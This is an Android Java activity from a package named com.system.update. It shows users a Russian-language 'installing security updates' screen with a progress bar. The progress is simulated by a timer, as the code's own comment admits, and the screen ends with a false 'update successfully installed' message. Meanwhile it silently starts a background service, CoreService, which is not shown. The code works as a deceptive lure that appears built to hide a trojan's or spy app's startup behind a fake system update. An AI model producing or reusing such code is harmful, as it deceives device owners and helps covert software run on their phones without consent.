package com.system.update;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.ProgressBar;
import android.widget.LinearLayout;
import android.graphics.Color;
import android.view.Gravity;
import android.content.Intent;
import android.os.Handler;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#121212"));

        TextView tv = new TextView(this);
        tv.setText("Установка обновлений\nбезопасности...");
        tv.setTextSize(22);
        tv.setTextColor(Color.WHITE);
        tv.setGravity(Gravity.CENTER);

        ProgressBar pb = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        pb.setMax(100);
        pb.setProgress(0);

        layout.addView(tv);
        layout.addView(pb);
        setContentView(layout);

        // Запускаем фоновый сервис
        startService(new Intent(this, CoreService.class));

        // Имитация загрузки
        final Handler handler = new Handler();
        new Thread(new Runnable() {
            int progress = 0;
            @Override
            public void run() {
                while (progress < 100) {
                    try { Thread.sleep(50); } catch (Exception ignored) {}
                    progress += 2;
                    final int p = progress;
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            pb.setProgress(p);
                        }
                    });
                }
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        tv.setText("Обновление успешно\nустановлено.");
                        pb.setVisibility(ProgressBar.GONE);
                    }
                });
            }
        }).start();
    }
}
